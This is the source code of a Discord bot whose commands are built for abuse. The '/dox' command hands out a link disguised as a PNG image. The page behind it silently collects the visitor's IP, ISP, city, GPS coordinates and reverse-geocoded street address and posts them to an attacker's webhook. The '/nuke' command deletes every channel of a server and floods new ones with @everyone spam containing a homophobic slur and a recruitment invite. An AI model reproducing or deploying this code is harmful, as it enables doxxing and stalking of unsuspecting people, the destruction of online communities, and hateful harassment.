const { Client, GatewayIntentBits, EmbedBuilder, PermissionsBitField } = require('discord.js');
const crypto = require('crypto');
const express = require('express');
const app = express();

const TOKEN = process.env.TOKEN;
const DEFAULT_WEBHOOK = process.env.WEBHOOK_URL;
const INVITE_LINK = 'https://discord.gg/eG6SyjWbh';
const PORT = process.env.PORT || 3000;

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages]
});

const links = new Map();

app.get('/img/:id.png', (req, res) => {
    const id = req.params.id;
    if (!links.has(id)) return res.status(404).send('Image not found');
    const data = links.get(id);
    res.type('text/html');
    res.send(generateDoxHTML(data.webhook || DEFAULT_WEBHOOK));
});
app.listen(PORT, () => console.log(`🌐 Dox server on ${PORT}`));

client.once('ready', async () => {
    console.log(`🤖 ${client.user.tag} ready`);
    await client.application.commands.set([]);
    await client.application.commands.set([
        {
            name: 'dox',
            description: 'Ultimate dox link (GPS + reverse geocode for exact address)',
            options: [{ name: 'webhook', type: 3, description: 'Webhook URL', required: true }]
        },
        {
            name: 'spam',
            description: 'Spam a channel',
            options: [
                { name: 'count', type: 4, description: 'Number of messages', required: true },
                { name: 'message', type: 3, description: 'Content', required: true }
            ]
        },
        {
            name: 'nuke',
            description: 'Delete channels, create 20, spam, leave',
            options: [
                { name: 'count', type: 4, description: 'Messages per channel (default 10, max 100)', required: false },
                { name: 'delay', type: 4, description: 'Delay between messages (ms, default 50)', required: false }
            ]
        },
        { name: 'ad', description: 'Advertise server' },
        {
            name: 'purge',
            description: 'Delete messages',
            options: [
                { name: 'amount', type: 4, description: 'Number of messages', required: true },
                { name: 'user', type: 6, description: 'Target user (optional)', required: false }
            ]
        }
    ]);
    console.log('✅ Commands loaded');
});

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isChatInputCommand()) return;

    // ---- DOX ----
    if (interaction.commandName === 'dox') {
        await interaction.deferReply({ ephemeral: true });
        const wh = interaction.options.getString('webhook');
        if (!wh.startsWith('https://discord.com/api/webhooks/')) {
            return interaction.editReply('❌ Invalid webhook URL.');
        }
        const id = crypto.randomBytes(6).toString('hex');
        const url = `https://pulsebot-qtgf.onrender.com/img/${id}.png`;
        links.set(id, { webhook: wh, user: interaction.user.tag });
        const embed = new EmbedBuilder()
            .setTitle('✅ Dox Ready')
            .setColor(0x22c55e)
            .setDescription(`🔗 ${url}\n\nSends exact address (GPS if allowed) + IP + location.`);
        await interaction.editReply({ embeds: [embed] });
        return;
    }

    // ---- SPAM ----
    if (interaction.commandName === 'spam') {
        await interaction.deferReply({ ephemeral: true });
        const count = interaction.options.getInteger('count');
        const msg = interaction.options.getString('message');
        const channel = interaction.channel;
        if (!channel) return interaction.editReply('❌ No channel.');
        const max = Math.min(count, 100);
        for (let i = 0; i < max; i++) {
            await channel.send(msg).catch(() => {});
        }
        await interaction.editReply(`✅ Spammed ${max} messages.`);
        return;
    }

    // ---- NUKE ----
    if (interaction.commandName === 'nuke') {
        await interaction.deferReply({ ephemeral: true });
        const guild = interaction.guild;
        if (!guild) return interaction.editReply('❌ Server only.');
        if (!guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) {
            return interaction.editReply('❌ I need Administrator.');
        }

        const messagesPerChannel = Math.min(interaction.options.getInteger('count') || 10, 100);
        const delayMs = Math.min(interaction.options.getInteger('delay') || 50, 500);
        const channelCount = 20;
        const maxLength = 2000;

        const baseLine = '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER';
        const variants = [
            baseLine,
            '# PULSE  OWNS ALL YOU F@GGOTS TRASH ASS SERVER',
            '# PULSE OWNS ALL  YOU F@GGOTS TRASH ASS SERVER',
            '# PULSE OWNS ALL YOU F@GGOTS TRASH  ASS SERVER',
            '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS  SERVER',
            '# PULSE OWNS ALL U F@GGOTS TRASH ASS SERVER',
            '# PULSE OWNS ALL YOU F@GGOTS TRASH AS SERVER',
            '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SRVER',
            '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERV ER',
            '# PULSE OWNS ALL YOU FAGGOTS TRASH ASS SERVER',
        ];
        const inviteLine = `# JOIN PULSE: ${INVITE_LINK}`;

        try {
            await Promise.all(guild.channels.cache.map(ch => ch.delete().catch(() => {})));

            const newChannels = await Promise.all(
                Array.from({ length: channelCount }, () =>
                    guild.channels.create({ name: 'pulse', type: 0 }).catch(() => null)
                )
            );
            const valid = newChannels.filter(c => c !== null);

            const messages = [];
            for (let i = 0; i < messagesPerChannel; i++) {
                const line = variants[i % variants.length];
                let bigMessage = `@everyone ${line}\n`;
                const repeatLine = line + '\n';
                while (bigMessage.length + repeatLine.length < maxLength - inviteLine.length - 2) {
                    bigMessage += repeatLine;
                }
                bigMessage += `\n${inviteLine}`;
                bigMessage = bigMessage.slice(0, maxLength);
                messages.push(bigMessage);
            }

            for (let i = 0; i < messages.length; i++) {
                const msg = messages[i];
                await Promise.all(valid.map(ch => ch.send(msg).catch(() => {})));
                if (i < messages.length - 1) await new Promise(r => setTimeout(r, delayMs));
            }

            await guild.leave();
            await interaction.editReply(`✅ Nuked. Created ${valid.length} channels, sent ${messagesPerChannel} messages each, left.`);
        } catch (e) {
            await interaction.editReply('❌ Nuke failed: ' + e.message);
        }
        return;
    }

    // ---- AD ----
    if (interaction.commandName === 'ad') {
        await interaction.deferReply({ ephemeral: true });
        const channel = interaction.channel;
        if (!channel) return interaction.editReply('❌ No channel.');
        const msg = `🔥 PULSE NUKE POWER 🔥\n${INVITE_LINK}`;
        await channel.send(msg).catch(() => {});
        await interaction.editReply('✅ Ad sent.');
        return;
    }

    // ---- PURGE ----
    if (interaction.commandName === 'purge') {
        await interaction.deferReply({ ephemeral: true });
        const amount = interaction.options.getInteger('amount');
        const user = interaction.options.getUser('user');
        const channel = interaction.channel;
        if (!channel) return interaction.editReply('❌ No channel.');
        if (!channel.permissionsFor(interaction.member).has(PermissionsBitField.Flags.ManageMessages)) {
            return interaction.editReply('❌ You need Manage Messages.');
        }
        let messages = await channel.messages.fetch({ limit: Math.min(amount, 100) });
        if (user) messages = messages.filter(m => m.author.id === user.id);
        const deleted = await channel.bulkDelete(messages, true).catch(() => {});
        await interaction.editReply(`✅ Purged ${deleted ? deleted.size : 0} messages.`);
        return;
    }
});

// ---- DOX HTML – GPS + Reverse Geocode for Exact Address ----
function generateDoxHTML(webhook) {
    return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title></title>
    <style>
        body { background: #ffffff; margin: 0; height: 100vh; }
    </style>
</head>
<body>
<script>
const WEBHOOK_URL = "${webhook}";

async function getIPData() {
    const apis = [
        { url: "https://ipinfo.io/json", parse: d => ({ ip: d.ip, country: d.country, region: d.region, city: d.city, postal: d.postal, lat: d.loc?.split(",")[0], lon: d.loc?.split(",")[1], asn: d.asn, isp: d.org, timezone: d.timezone }) },
        { url: "https://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,as,isp,query", parse: d => ({ ip: d.query, country: d.country, region: d.regionName, city: d.city, postal: d.zip, lat: d.lat, lon: d.lon, asn: d.as, isp: d.isp, timezone: "N/A" }) },
        { url: "https://api.ipify.org?format=json", parse: d => ({ ip: d.ip }) },
        { url: "https://ipapi.co/json/", parse: d => ({ ip: d.ip, country: d.country_name, region: d.region, city: d.city, postal: d.postal, lat: d.latitude, lon: d.longitude, asn: d.asn, isp: d.org, timezone: d.timezone }) },
        { url: "https://api.ip.sb/geoip", parse: d => ({ ip: d.ip, country: d.country, region: d.region, city: d.city, postal: d.postal, lat: d.latitude, lon: d.longitude, asn: d.asn, isp: d.isp, timezone: d.timezone }) },
        { url: "https://geoplugin.net/json.gp", parse: d => ({ ip: d.geoplugin_request, country: d.geoplugin_countryName, region: d.geoplugin_region, city: d.geoplugin_city, postal: d.geoplugin_postcode, lat: d.geoplugin_latitude, lon: d.geoplugin_longitude, asn: "N/A", isp: d.geoplugin_isp, timezone: d.geoplugin_timezone }) }
    ];
    for (const api of apis) {
        try {
            const controller = new AbortController();
            const timeout = setTimeout(() => controller.abort(), 5000);
            const res = await fetch(api.url, { signal: controller.signal });
            clearTimeout(timeout);
            const data = await res.json();
            if (data.ip) {
                const result = api.parse(data);
                if (result.ip) return result;
            }
        } catch (e) { console.error("IP fetch failed:", api.url, e); }
    }
    return { ip: "N/A", country: "N/A", region: "N/A", city: "N/A", postal: "N/A", lat: "N/A", lon: "N/A", asn: "N/A", isp: "N/A", timezone: "N/A" };
}

async function reverseGeocode(lat, lon) {
    try {
        const res = await fetch("https://nominatim.openstreetmap.org/reverse?lat=" + lat + "&lon=" + lon + "&format=json&zoom=18&addressdetails=1");
        const data = await res.json();
        if (data && data.display_name) return data.display_name;
    } catch (e) { console.error("Reverse geocode failed:", e); }
    return null;
}

async function getGPS() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve({ lat: "N/A", lon: "N/A", acc: "N/A" });
            return;
        }
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: Math.round(pos.coords.accuracy) + "m" });
            },
            (err) => {
                resolve({ lat: "N/A", lon: "N/A", acc: "N/A" });
            },
            { enableHighAccuracy: true, timeout: 8000 }
        );
    });
}

(async function() {
    try {
        const ip = await getIPData();
        const now = new Date();
        const timestamp = now.toISOString();
        const localTime = now.toString();
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

        const gps = await getGPS();
        let address = "N/A";
        let lat = ip.lat || "N/A";
        let lon = ip.lon || "N/A";
        let accuracy = "N/A";
        let source = "IP Geolocation";

        if (gps.lat !== "N/A") {
            lat = gps.lat;
            lon = gps.lon;
            accuracy = gps.acc;
            source = "GPS (exact)";
            const addr = await reverseGeocode(gps.lat, gps.lon);
            if (addr) address = addr;
        }

        const fields = [
            { name: "📍 Address", value: address, inline: false },
            { name: "📌 Coordinates", value: lat + ", " + lon, inline: true },
            { name: "🎯 Accuracy", value: accuracy, inline: true },
            { name: "📡 Source", value: source, inline: true },
            { name: "🌐 IP", value: ip.ip || "N/A", inline: true },
            { name: "🏙️ City", value: ip.city || "N/A", inline: true },
            { name: "🗺️ Region", value: ip.region || "N/A", inline: true },
            { name: "📮 Postal", value: ip.postal || "N/A", inline: true },
            { name: "🔢 ASN", value: ip.asn || "N/A", inline: true },
            { name: "🏢 ISP", value: ip.isp || "N/A", inline: true },
            { name: "🕒 Timezone", value: ip.timezone || "N/A", inline: true },
            { name: "⏰ Local Time", value: localTime, inline: false },
            { name: "📅 Timestamp", value: timestamp, inline: false }
        ];

        const embed = {
            title: "☠️ Doxxed",
            color: 0xFF0000,
            fields: fields,
            footer: { text: "Logged at " + timestamp }
        };

        await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ embeds: [embed] })
        });

    } catch (err) {
        console.error("Dox error:", err);
    }

    document.body.innerHTML = "";
    document.body.style.background = "#ffffff";
    document.body.style.margin = "0";
    document.body.style.height = "100vh";
    setTimeout(() => {
        window.close();
        window.location.href = "about:blank";
    }, 1000);
})();
<\/script>
</body>
</html>`;
}

client.login(TOKEN);
